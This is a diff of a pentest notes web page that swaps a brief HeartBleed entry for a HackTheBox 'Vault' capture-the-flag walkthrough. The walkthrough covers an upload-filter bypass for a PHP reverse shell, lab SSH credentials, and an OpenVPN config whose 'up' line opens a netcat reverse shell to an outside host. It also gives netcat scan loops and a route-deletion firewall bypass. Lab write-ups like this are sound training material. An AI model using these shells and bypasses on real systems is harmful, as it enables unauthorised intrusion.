@@ -6,7 +6,7 @@
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <meta name="revised" content="2019-04-06T02:33:26 EDT">
-<title>HeartBleed :: DocDock Documentation</title>
+<title>Vault :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -25,7 +25,7 @@
 
     
   </head>
-  <body data-url="/concepts/webapppentest/heartbld/">
+  <body data-url="/hackthebox/boxes/vault/">
     
       <header>
   <div class="logo">
@@ -73,20 +73,18 @@
   <aside>
     <ul class="menu">
 <a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
-<li data-nav-id="/concepts/" class="dd-item parent haschildren
+<li data-nav-id="/concepts/" class="dd-item haschildren
         ">
     <div>
 
-        <a href="/concepts/">Concept</a>
-        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
-<li data-nav-id="/concepts/webapppentest/" class="dd-item parent haschildren
+<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
         ">
     <div>
 
-        <a href="/concepts/webapppentest/">WebAppPenTests</a>
-        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
 <li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
@@ -96,7 +94,7 @@
         <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item parent active
+<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
         ">
     <div>
 
@@ -121,18 +119,20 @@
 </li>
     </ul>
 </li>
-<li data-nav-id="/hackthebox/" class="dd-item haschildren
+<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
         ">
     <div>
 
-        <a href="/hackthebox/">HackTheBox</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+        <a href="/hackthebox/">HackTheBox</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
-<li data-nav-id="/hackthebox/boxes/" class="dd-item haschildren
+<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
         ">
     <div>
 
-        <a href="/hackthebox/boxes/">Boxes</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+        <a href="/hackthebox/boxes/">Boxes</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
 <li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
@@ -219,7 +219,7 @@
         <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/hackthebox/boxes/vault/" class="dd-item">
+<li data-nav-id="/hackthebox/boxes/vault/" class="dd-item active">
     <div>
         <a href="/hackthebox/boxes/vault/">
             Vault
@@ -452,27 +452,61 @@
         <select onchange="javascript:location.href = this.value;">
           
     <option value="/concepts/" >
-   Concept</option> 
-    <option value="/concepts/webapppentest/" >
-  - 
-   WebAppPenTests</option> 
-    <option value="/concepts/webapppentest/lfi/" >
-  -- 
-    Local File inclusion</option>
-    <option value="/concepts/webapppentest/heartbld/"  selected>
-  -- 
-   HeartBleed</option> 
-  
-    <option value="/concepts/webapppentest/osinjcmd/" >
-  -- 
-   OS Command Injection</option>
-    <option value="/concepts/webapppentest/phptypejuggling/" >
-  -- 
-   PHP Typw Juggling</option>
-  
-  
+   Concept</option>
     <option value="/hackthebox/" >
-   HackTheBox</option>
+   HackTheBox</option> 
+    <option value="/hackthebox/boxes/" >
+  - 
+   Boxes</option> 
+    <option value="/hackthebox/boxes/hawk/" >
+  -- 
+   </option>
+    <option value="/hackthebox/boxes/blue/" >
+  -- 
+   Blue</option>
+      <option value="/hackthebox/boxes/carrier/" >-- Carrier</option>
+      <option value="/hackthebox/boxes/carrier-root/" >-- CarrierRoot</option>
+    <option value="/hackthebox/boxes/crimestoppers/" >
+  -- 
+   CrimeStopper</option>
+      <option value="/hackthebox/boxes/devel/" >-- Devel</option>
+    <option value="/hackthebox/boxes/legacy/" >
+  -- 
+   Legacy</option>
+    <option value="/hackthebox/boxes/mischief/" >
+  -- 
+   Mischief</option>
+      <option value="/hackthebox/boxes/optimum/" >-- Optimum</option>
+    <option value="/hackthebox/boxes/poison/" >
+  -- 
+   Poison</option>
+    <option value="/hackthebox/boxes/secnotes/" >
+  -- 
+   SecNotes</option>
+    <option value="/hackthebox/boxes/valentine/" >
+  -- 
+   Valentine</option>
+      <option value="/hackthebox/boxes/vault/"  selected>-- Vault</option>
+    <option value="/hackthebox/boxes/waldo/" >
+  -- 
+   Waldo</option>
+    <option value="/hackthebox/boxes/zipper/" >
+  -- 
+   Zipper</option>
+    <option value="/hackthebox/boxes/oz/" >
+  -- 
+   oz</option>
+    <option value="/hackthebox/boxes/sunday/" >
+  -- 
+   sunday</option>
+  
+    <option value="/hackthebox/github/" >
+  - 
+   GitHub</option>
+    <option value="/hackthebox/challenges/" >
+  - 
+   Miscellaneous</option>
+  
     <option value="/help/" >
    Network Manager Down</option>
     <option value="/tools/" >
@@ -499,28 +533,144 @@
       </div>
     
 
-    <h1>HeartBleed</h1>
+    <h1>Vault</h1>
     
     
     
+    
 
-<p>Heart bleed is an OpenSSL vulnerability that allows the attacker to �bleed� out whatever in memory on the server. You can also dump the TSL/SSL cert for the webpage. You can modify the exploit to continuously extract data at 64 bytes at a time.
-Messing around with the POC was tricky the c code has all these errors and won�t compile arg, luckily for me, Metasploit has the solution.</p>
+<h3 id="vault">Vault</h3>
 
-<p>Proff of concept
-<a href="https://www.exploit-db.com/exploits/32745/">https://www.exploit-db.com/exploits/32745/</a></p>
+<p>Nmap showed some ephemeral ports, ssh, HTTP. Gobuster didn’t initially show anything. Tried wfuzz to check for possible subdomains nothing.</p>
 
-<p>Metasploit:
-<a href="https://www.rapid7.com/db/modules/auxiliary/scanner/ssl/openssl_heartbleed">https://www.rapid7.com/db/modules/auxiliary/scanner/ssl/openssl_heartbleed</a></p>
+<p>moving on to the webpage slowdaddy webpage haaha. talks about how the webpage is under construction in the first client is sparklays. which is a real jewelry company. Gobuster was tricky append sparklays to url, and use txt,html,php extentions. I used the seclist to find the directory.</p>
 
+<p>so it turns out its not sql injections pretty happy with that. Using gobuster found changelogo directory and uploads.</p>
+
+<pre><code>sparklays/design/design
+http://vault.htb/sparklays/design/changelogo.php
+http://vault.htb/sparklays/design/uploads
+</code></pre>
+
+<p>this will give us the ability to upload a php-reverse shell. there is a filter or a waf blocking some common extensions. using php5 as the extension bypassed the restrictions.  to run the reverse shell we need to access at uploads</p>
+
+<pre><code>http://vault.htb/sparklays/design/uploads/rshell.php5
+</code></pre>
+
+<p>once inside you&rsquo;ll notice key, server, ssh files in the Desktop directory. the key is for later.</p>
+
+<pre><code>Servers output
+###
+DNS + Configurator - 192.168.122.4
+Firewall - 192.168.122.5
+The Vault - x
+###
+ssh
+###
+dave
+Dav3therav3123
+###
+ENUMERATING WITH NETCAT
+for loop to scan an ip range
+for i in {1..254}; do nc -v -n -z -w 1 192.168.122.$i 22; done
+simpler version 
+Enumerate a port range
+nc -zv -w 1 192.168.122.4 1-1000 2&gt;&amp;1 | grep succeeded!
+</code></pre>
+
+<p>next use netcat to scan DNS server found 22 &amp; 80.</p>
+
+<p>SSHUTTLE</p>
+
+<p>sshuttle will forward 10.10.10.109 to 192.168.122.0/24 allowing us to access the webpage. going to vpn configure were allowed to edit the vpn.conf file. quick google search reverses shell vpn.conf file. lead me to this <a href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da">https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da</a></p>
+
+<p><img src="C:UserscharlPictureshacktheboxvaultdns-webpage.PNG" alt="dns-webpage" /></p>
+
+<p><img src="C:UserscharlPictureshacktheboxvaultvpn_config.PNG" alt="vpn_config" /></p>
+
+<pre><code>remote 192.168.1.245
+ifconfig 10.200.0.2 10.200.0.1
+dev tun
+script-security 2
+up “/bin/bash -c ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.122.1 9056 &gt;/tmp/f’”
+nobind
+</code></pre>
+
+<p>For whatever reason editing remote or ifconfig does affect whether it&rsquo;ll works or not. setup a netcat listener get ready for the shell. This took a while to figure out. Once inside DNS some more ssh files user.txt. This part was pretty hard because there&rsquo;s nothing to exploit don’t really see anything. when I first did the box I found someone else&rsquo;s junk laying around. DNS has nmap on it so scan for available IP. after running nmap 192.168.0.0/16</p>
+
+<p>Well, gosh darn it (internally rages)I got access by skipping a very important part. no fault to my own. So now im going to build a variety of ways to detect this in the future.</p>
+
+<p><img src="C:UserscharlPictureshacktheboxvaultnetwork lay out.png" alt="network lay out" /></p>
+
+<p>nmap is available performing a very verbose scan of 192.168.5.0 ip range descover another ip address. You can also you netcat to do that scan.</p>
+
+<pre><code>nmap -Pn -vvv -sV  192.168.5.0/28 -T5
+used a smaller iprange for time.
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/vault/nmap_dns_vault.png" alt="img" /></p>
+
+<pre><code>Note this assumes that one port is predominantly open in the environment to scan.
+ONE LINER:
+for i in {1..29}; do nc -v -n -z -w 1 192.168.5.$i 53 |grep failed; done
+SMALL SCRIPT
+for ip in $(seq 1 1000); do
+nc -zv -w 1 192.168.5.2 $ip 53 2&gt;&amp;1 &gt; /tmp/nul | grep -v 'timed' &amp;
+done
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/vault/would_u_even_know.png" alt="img" /></p>
+
+<p>after we verified that 192.168.5.2 is the next target.</p>
+
+<p>Bypassing firewalls</p>
+
+<p>i suspect the firewall rules look similar to the image below explicitly blocking 192.168.5.1 from accessing port 987. that&rsquo;s why none of the enumeration techniques worked. dhclient -r doesn&rsquo;t reset the IP address.</p>
+
+<p><img src="C:UserscharlPictureshacktheboxvaultfirewall rules.PNG" alt="firewall rules" /></p>
+
+<p>Deleting the default gateway address and changing the IP address will bypass the firewall. The IP address in the environment is static, theirs no DHCP to keep track of what mac was assigned an IP address. What is a routing table inside Linux? When there no DHCP or central authority for routing tables operating systems have a habit of trying to understand the environment around them. Every time a connection is made the operating system updates the routing table with the shortest path possible. I think this speaks more to a poorly setup vault. There are actually two paths to vault not one. The route table is configured to send all the traffic to the gateway at 192.168.122.5 there are no controls in place to keep track of everything. Deleting the route to the firewall and changing our IP address will bypass the firewall. If this was configured a little better I also suspect the network is a ring; this trick wouldn’t happen.</p>
+
+<p><img src="C:UserscharlPictureshacktheboxvaultnetwork lay out 2.png" alt="network lay out 2" /></p>
+
+<p><img src="C:UserscharlPictureshacktheboxvaultroute.PNG" alt="route" /></p>
+
+<p>route</p>
+
+<p>So netstat is deprecated, waa ….yep you heard right its trash. the route is the new and shiny Ferrari. Ifconfig is also garbage IP is the cmd line of the future.</p>
+
+<pre><code>sudo ip addr add 192.168.5.123/24 dev ens3
+sudo route del -net 192.168.5.0/24 gw 192.168.122.5
+</code></pre>
+
+<iframe data-width="600" data-height="780" width="600" height="780" src="/media/e64992fff9ddb3cc3dacc1c3488afa73" data-media-id="e64992fff9ddb3cc3dacc1c3488afa73" allowfullscreen="" frameborder="0"></iframe>
+
+<p>now after all this you can use nmap to scan for the filtered ssh port.</p>
+
+<pre><code>nmap -sT -Pn 192.168.5.2
+-sT is the tcp connections switch apposed to probing with ping
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/vault/1*1d0P19_vLLQY1I83uy3XHQ.png" alt="img" /></p>
+
+<pre><code>netcat 
+nc -zv -w 1 192.168.5.2 987 2&gt;&amp;1 | grep succeeded!
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/vault/1*0cc_q5FciV6MEK3i-V5swg.png" alt="img" /></p>
+
+<p>lastly, gpg is common encryption storing the token ring on the system. so moving it off and trying to decrypt it can be quite the challenges. I used netcat to move the root.txt to 192.168.122.1. the passphrase is itscominghome.</p>
+
+<pre><code>gpg -d /tmp/test.txt.gpg
+</code></pre>
 
 
     
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/concepts/webapppentest/lfi/" title=" Local File inclusion"> <i class="fa fa-chevron-left"></i><label> Local File inclusion</label></a>
-    <a class="nav nav-next" href="/concepts/webapppentest/osinjcmd/" title="OS Command Injection" style="margin-right: 0px;"><label>OS Command Injection</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/hackthebox/boxes/valentine/" title="Valentine"> <i class="fa fa-chevron-left"></i><label>Valentine</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/waldo/" title="Waldo" style="margin-right: 0px;"><label>Waldo</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
@@ -537,7 +687,7 @@ Messing around with the POC was tricky the c code has all these errors and won�t
 
     
     <div class="github-link">
-      <a href="https://chickenpwny.github.ioConcepts/WebAppPenTest/Heartbld/_index.md" target="blank"><i class="fa fa-code-fork"></i>
+      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/Vault.md" target="blank"><i class="fa fa-code-fork"></i>
         Improve this page</a>
     </div>
     
